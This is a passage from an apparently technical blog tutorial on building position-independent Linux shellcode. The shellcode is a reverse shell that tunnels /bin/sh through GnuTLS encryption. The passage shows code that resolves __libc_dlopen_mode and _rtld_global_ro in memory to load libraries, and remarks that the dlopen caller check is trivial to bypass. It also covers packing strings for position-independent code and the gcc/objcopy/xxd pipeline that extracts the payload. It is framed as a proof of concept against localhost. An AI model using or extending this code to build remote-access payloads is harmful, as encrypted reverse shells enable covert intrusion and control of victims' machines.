<pre style='color:#000000;background:#ffffff;'>  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>clib<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>gnutls<span style='color:#800080; '>;</span>
  
  <span style='color:#696969; '>// 1. resolve the address of _dl_addr in libc.so</span>
  clib <span style='color:#808030; '>=</span> get_module_handle<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>libc</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  _dl_open <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>dl_open_t<span style='color:#808030; '>)</span>get_proc_address<span style='color:#808030; '>(</span>clib<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>__libc_dlopen_mode</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#696969; '>// 2. load gnutls</span>
  gnutls <span style='color:#808030; '>=</span> _dl_open<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>/usr/lib/x86_64-linux-gnu/libgnutls.so</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> RTLD_LAZY<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>Now onto the <code>_rtld_global_ro</code> object that may be of interest to you. The following shows the function pointers for dynamic loading. Depending on the version of glibc, the structure itself can differ in size. I was curious to see if it was possible to find <code>_dl_open</code> using this object in the event <code>__libc_dlopen_mode</code> was not available for any reason.</p>
     
<pre>
user@nostromo:~/hub/shellcode$ readelf -s /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 |grep -i "rtld_global_ro"
    25: 0000000000223ca0   376 OBJECT  GLOBAL DEFAULT   16 _rtld_global_ro@@GLIBC_PRIVATE
</pre>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> SHARED</span>
  <span style='color:#696969; '>// We add a function table to _rtld_global which is then used to</span>
  <span style='color:#696969; '>//   call the function instead of going through the PLT.  The result</span>
  <span style='color:#696969; '>//   is that we can avoid exporting the functions and we do not jump</span>
  <span style='color:#696969; '>//   PLT relocations in libc.so.</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_debug_printf<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>.</span><span style='color:#808030; '>.</span><span style='color:#808030; '>.</span><span style='color:#808030; '>)</span>
       __attribute__ <span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>__format__ <span style='color:#808030; '>(</span>__printf__<span style='color:#808030; '>,</span> <span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#808030; '>(</span>internal_function <span style='color:#808030; '>*</span>_dl_catch_error<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>*</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
					    bool <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span>internal_function <span style='color:#808030; '>*</span>_dl_signal_error<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
					      <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_mcount<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span>ElfW<span style='color:#808030; '>(</span>Addr<span style='color:#808030; '>)</span> frompc<span style='color:#808030; '>,</span> ElfW<span style='color:#808030; '>(</span>Addr<span style='color:#808030; '>)</span> selfpc<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  lookup_t <span style='color:#808030; '>(</span>internal_function <span style='color:#808030; '>*</span>_dl_lookup_symbol_x<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>const</span> ElfW<span style='color:#808030; '>(</span>Sym<span style='color:#808030; '>)</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>struct</span> r_scope_elem <span style='color:#808030; '>*</span><span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>struct</span> r_found_version <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>int</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span><span style='color:#808030; '>,</span>
						     <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
                 
  <span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_check_caller<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>enum</span> allowmask<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_open<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>file<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span> mode<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>caller_dlopen<span style='color:#808030; '>,</span>
		     Lmid_t nsid<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span> argc<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>argv<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>env<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_close<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>map<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_tls_get_addr_soft<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
<span style='color:#004a43; '>#</span><span style='color:#004a43; '>ifdef</span><span style='color:#004a43; '> HAVE_DL_DISCOVER_OSVERSION</span>
  <span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>_dl_discover_osversion<span style='color:#808030; '>)</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
<span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
</pre>

<p>You can view the data for a process under GDB if you know the address of <code>_rtld_global_ro</code>.</p>

<pre>
(gdb) x/40xg 0x7ffff7ffcca0
0x7ffff7ffcca0 <_rtld_global_ro>:     0x0004099000000000  0x00007fffffffe4d9
0x7ffff7ffccb0 <_rtld_global_ro+16>:  0x0000000000000006  0x0000000000001000
0x7ffff7ffccc0 <_rtld_global_ro+32>:  0x0000000000000000  0x00007ffff7fcca30
0x7ffff7ffccd0 <_rtld_global_ro+48>:  0x0000000000000004  0x0000000000000064
0x7ffff7ffcce0 <_rtld_global_ro+64>:  0x0000000100000002  0x0000000000000000
0x7ffff7ffccf0 <_rtld_global_ro+80>:  0x000003030000037f  0x00000000bfebfbff
0x7ffff7ffcd00 <_rtld_global_ro+96>:  0x0000000000000000  0x00007fffffffe390
0x7ffff7ffcd10 <_rtld_global_ro+112>: 0x0000001600000001  0x02100800000406e3
0x7ffff7ffcd20 <_rtld_global_ro+128>: 0xbfebfbff7ffafbbf  0x029c67af00000000
0x7ffff7ffcd30 <_rtld_global_ro+144>: 0x0000000000000000  0x0000000000000000
0x7ffff7ffcd40 <_rtld_global_ro+160>: 0x0000000000000000  0x0000004e00000006
0x7ffff7ffcd50 <_rtld_global_ro+176>: 0x00000000000003c0  0x000000000034ccf1
0x7ffff7ffcd60 <_rtld_global_ro+192>: 0x0000000000000000  0x0000000000000000
0x7ffff7ffcd70 <_rtld_global_ro+208>: 0x0000000000000000  0x0000000000000000
0x7ffff7ffcd80 <_rtld_global_ro+224>: 0x00007ffff7df503c  0x0000000000000000
0x7ffff7ffcd90 <_rtld_global_ro+240>: 0x0000000000000000  0x00007ffff7ffec28
0x7ffff7ffcda0 <_rtld_global_ro+256>: 0x00007ffff7ffa000  0x00007ffff7ffe708
0x7ffff7ffcdb0 <_rtld_global_ro+272>: 0x0000000000000000  0x00007ffff7de9630
0x7ffff7ffcdc0 <_rtld_global_ro+288>: 0x00007ffff7de85d0  0x00007ffff7de8390
0x7ffff7ffcdd0 <_rtld_global_ro+304>: 0x00007ffff7deaa30  0x00007ffff7de2ea0
</pre>

<p>Using some simple code, we can identify with <code>_dl_addr</code> the addresses that belong to ld-linux.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>dli_fname<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// File name of defining object.   </span>
  <span style='color:#800000; font-weight:bold; '>void</span>       <span style='color:#808030; '>*</span>dli_fbase<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// Load address of that object.    </span>
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>dli_sname<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// Name of nearest symbol.         </span>
  <span style='color:#800000; font-weight:bold; '>void</span>       <span style='color:#808030; '>*</span>dli_saddr<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// Exact value of nearest symbol.  </span>
<span style='color:#800080; '>}</span> Dl_info<span style='color:#800080; '>;</span>

<span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>dl_addr_t<span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>address<span style='color:#808030; '>,</span> 
  Dl_info <span style='color:#808030; '>*</span>info<span style='color:#808030; '>,</span> 
  <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>*</span>mapp<span style='color:#808030; '>,</span> 
  <span style='color:#800000; font-weight:bold; '>const</span> Elf64_Sym <span style='color:#808030; '>*</span><span style='color:#808030; '>*</span>symbolp<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
  
  <span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span><span style='color:#808030; '>-</span>
    dl_addr_t _dl_addr<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span>      <span style='color:#808030; '>*</span>clib<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>ld<span style='color:#800080; '>;</span>
    uint64_t  <span style='color:#808030; '>*</span>rtld<span style='color:#800080; '>;</span>
    DL_info   info<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. resolve the address of _dl_addr in libc.so</span>
    clib <span style='color:#808030; '>=</span> get_module_handle<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>libc</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    _dl_addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>dl_addr_t<span style='color:#808030; '>)</span>get_proc_address<span style='color:#808030; '>(</span>clib<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>_dl_addr</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 2. resolve the address of _rtld_global_ro in ld-linux.so</span>
    ld <span style='color:#808030; '>=</span> get_module_handle<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>ld-linux</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    rtld <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>get_proc_address<span style='color:#808030; '>(</span>ld<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>_rtld_global_ro</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 3. try the first 64 entries</span>
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>i<span style='color:#808030; '>&lt;</span><span style='color:#008c00; '>64</span><span style='color:#800080; '>;</span>i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_dl_addr<span style='color:#808030; '>(</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>rtld<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>info<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>map<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>sym<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>str <span style='color:#808030; '>=</span> info<span style='color:#808030; '>.</span>dli_sname <span style='color:#800080; '>?</span> <span style='color:#800080; '>:</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>N/A</span><span style='color:#800000; '>"</span><span style='color:#800080; '>;</span>
        <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>[</span><span style='color:#007997; '>%i</span><span style='color:#0000e6; '>] </span><span style='color:#007997; '>%p</span><span style='color:#0000e6; '> : </span><span style='color:#007997; '>%-10s</span><span style='color:#0000e6; '> : </span><span style='color:#007997; '>%s</span><span style='color:#0000e6; '> </span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> 
          i<span style='color:#808030; '>,</span> rtld<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> str<span style='color:#808030; '>,</span> info<span style='color:#808030; '>.</span>dli_fname<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
</pre>

<p>Below shows basic output using the above code.</p>

<pre>
[28] 0x7f5dde45c03c : N/A        : /lib64/ld-linux-x86-64.so.2 
[32] 0x7ffd6d904000 : LINUX_2.6  : linux-vdso.so.1 
[35] 0x7f5dde450630 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_printf 
[36] 0x7f5dde44f5d0 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_catch_error
[37] 0x7f5dde44f390 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_signal_error
[38] 0x7f5dde451a30 : _dl_mcount : /lib64/ld-linux-x86-64.so.2  // _dl_mcount
[39] 0x7f5dde449ea0 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_lookup_symbol_x
[40] 0x7f5dde452fc0 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_check_caller
[41] 0x7f5dde453540 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_open
[42] 0x7f5dde455560 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_close
[43] 0x7f5dde452b40 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_tls_get_addr_soft
[44] 0x7f5dde457b80 : N/A        : /lib64/ld-linux-x86-64.so.2  // _dl_discover_osversion
</pre>

<p>In this instance, we know the address of <code>_dl_open</code> will be at <code>_rtld_global_ro + 41*8</code>. It's certainly possible to call the function, but internally is a check for where the call originated from. <code>dl_check_caller</code> will determine if the call originated from a valid Dynamic Shared Object (DSO).</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// Bit masks for the objects which valid callers can come from to</span>
<span style='color:#696969; '>//   functions with restricted interface.  </span>
<span style='color:#800000; font-weight:bold; '>enum</span> allowmask <span style='color:#800080; '>{</span>
    allow_libc <span style='color:#808030; '>=</span> <span style='color:#008c00; '>1</span><span style='color:#808030; '>,</span>
    allow_libdl <span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>,</span>
    allow_libpthread <span style='color:#808030; '>=</span> <span style='color:#008c00; '>4</span><span style='color:#808030; '>,</span>
    allow_ldso <span style='color:#808030; '>=</span> <span style='color:#008c00; '>8</span>
  <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
</pre>

<p>The following is a snippet of the code to validate a caller from <code>elf/dl-caller.c</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>static</span> <span style='color:#800000; font-weight:bold; '>void</span> dl_open_worker <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>a<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
  <span style='color:#800000; font-weight:bold; '>struct</span> dl_open_args <span style='color:#808030; '>*</span>args <span style='color:#808030; '>=</span> a<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>file <span style='color:#808030; '>=</span> args<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>file<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>int</span> mode <span style='color:#808030; '>=</span> args<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>mode<span style='color:#800080; '>;</span>
  <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span>call_map <span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>

  <span style='color:#696969; '>// Check whether _dl_open() has been called from a valid DSO.</span>
  <span style='color:#800000; font-weight:bold; '>if</span> <span style='color:#808030; '>(</span>__check_caller <span style='color:#808030; '>(</span>args<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>caller_dl_open<span style='color:#808030; '>,</span>
		      allow_libc<span style='color:#808030; '>|</span>allow_libdl<span style='color:#808030; '>|</span>allow_ldso<span style='color:#808030; '>)</span> <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span>
    _dl_signal_error <span style='color:#808030; '>(</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>dlopen</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> N_<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>invalid caller</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>As you can see, only <code>libc.so</code>, <code>libdl.so</code> and <code>ld.so</code> are permitted to load a library. Bypassing this check is trivial, but thankfully not required because <code>libc.so</code> exports <code>__libc_dlopen_mode</code></p>

<h3 id="load_ld_config">8.2 Parsing /etc/ld.so.conf</h3>

<p>A list of shared libraries are stored in <code>/etc/ld.so.cache</code> and a list of trusted paths can be found in <code>/etc/ld.so.conf</code>. If you wanted to map a library into memory without knowing the full path, one way would be checking each of the entries in cache or by appending the name of a library to each of the paths found in the configuration file. For this shellcode, all libraries required are stored in the cache list and <code>dlopen</code> doesn't require a full path.</p>

<h3 id="shell">9. Reverse Shell using SSL/TLS</h3>

<p>The reverse shell uses synchronization so that it's possible to create a sub process running <code>/bin/sh</code> with stdin,stdout and stderr being redirected through anonymous pipes. This allows us to encrypt/decrypt using the GNU TLS functions. It is based on <a href="https://github.com/odzhan/shellcode/tree/master/os/linux/c">epl.c</a> that does not use any encryption for interacting with <code>/bin/sh</code></p>

<h3 id="dsdata">9.1 Data Table</h3>

<p>Since we can't use any global variables for a PIC, everything is stored on the stack. To manage this data more efficiently, I've defined a structure that contains all the pointers to functions and variables for various operations should it be required by other subroutines.</p>
  
<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _data_t <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span> s<span style='color:#800080; '>;</span>       <span style='color:#696969; '>// socket file descriptor</span>

    <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
      uint64_t hash<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>void</span>     <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>[</span><span style='color:#008c00; '>64</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
        <span style='color:#696969; '>// gnu c library functions</span>
        pipe_t          _pipe<span style='color:#800080; '>;</span>
        fork_t          _fork<span style='color:#800080; '>;</span>
        socket_t        _socket<span style='color:#800080; '>;</span>
        <span style='color:#696969; '>// .... snipped</span>
      <span style='color:#800080; '>}</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> api<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> data_t<span style='color:#800080; '>;</span>
</pre>

<h3 id="strings">9.2 Strings</h3>

<p>Declaring strings is a slight problem for a shellcode because GCC will move them all to a read-only segment (<code>.rodata</code>) which is separate from the (<code>.text</code>) segment. A few ways can be used to work around this. For example, elfmaster suggests using the <var>-N</var> option of the linker <code>ld</code> to create an OMAGIC binary where all segments are combined into one. fishstiqz uses a combination of macros and inline assembly. What I do for this shellcode is initialize an array of integers using the string converted to integer values. GCC should do this automatically, but it's currently not an option.</p>

<pre style='color:#000000;background:#ffffff;'>    <span style='color:#696969; '>// align up by 4</span>
    len <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>len <span style='color:#808030; '>&amp;</span> <span style='color:#808030; '>-</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>)</span> <span style='color:#808030; '>+</span> <span style='color:#008c00; '>4</span><span style='color:#800080; '>;</span>
    len <span style='color:#808030; '>></span><span style='color:#808030; '>></span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>i<span style='color:#808030; '>&lt;</span>len<span style='color:#800080; '>;</span>i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>str[</span><span style='color:#007997; '>%i</span><span style='color:#0000e6; '>] = 0x</span><span style='color:#007997; '>%08lx</span><span style='color:#0000e6; '>;</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> i<span style='color:#808030; '>,</span> str<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
</pre>

<p>The string "/proc/self/maps" is then converted into: </p>

<pre style='color:#000000;background:#ffffff;'>    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6f72702f</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x65732f63</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6d2f666c</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x00737061</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
</pre>

<h3 id="compile">9.3 Compiling</h3>

<p>A <code>Makefile</code> is provided to compile and extract the shellcode automatically. It uses the following to compile and extract. xxd then converts the binary in tls.bin to a C style string and redirects output to tls.h. Don't forget that tls.c uses port 1234 and 127.0.0.1 as the peer address. It's only a Proof of Concept.</p>

<pre>
  gcc -O0 -nostdlib -fpic tls.c -o tls
  objcopy -O binary --only-section=.text tls tls.bin
  xxd -i tls.bin > tls.h
</pre>

<p>GCC option <var>-O0</var> implies disabling optimizations. <var>-nostdlib</var> implies not using any standard library functions and <var>-fpic</var> implies generating position-independent code. Objcopy simply extracts the executable code stored in the <code>.text</code> segment.</p>
  
<h3 id="testing">9.4 Testing</h3>

